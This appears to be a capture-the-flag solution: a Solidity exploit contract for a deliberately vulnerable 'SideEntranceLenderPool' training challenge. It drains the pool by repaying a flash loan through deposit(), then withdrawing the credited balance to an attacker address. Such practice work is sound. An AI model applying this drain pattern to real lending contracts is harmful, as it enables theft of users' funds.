// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Exploit_SideEntrance {
    ISideEntranceLenderPool public pool;

    constructor(ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function exploit(address payable receiver) external {
        // pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
        pool.flashLoan(1000 ether);
        // Withdraw the credited balance to this contract
        pool.withdraw();
        // ransfer the stolen funds to attacker's EOA
        receiver.transfer(address(this).balance);
    }

    // Called by SideEntranceLenderPool::flashLoan
    function execute() public payable {
        // Return the flash loan using 'deposit()' function in the pool contract.
        // Using 'deposit()' will credit this contract with the amount of
        // returned flash loan had been taken.
        pool.deposit{value: address(this).balance}();
    }

    // This is necessary for this contract to be able to receive ETH
    receive() external payable {}
}
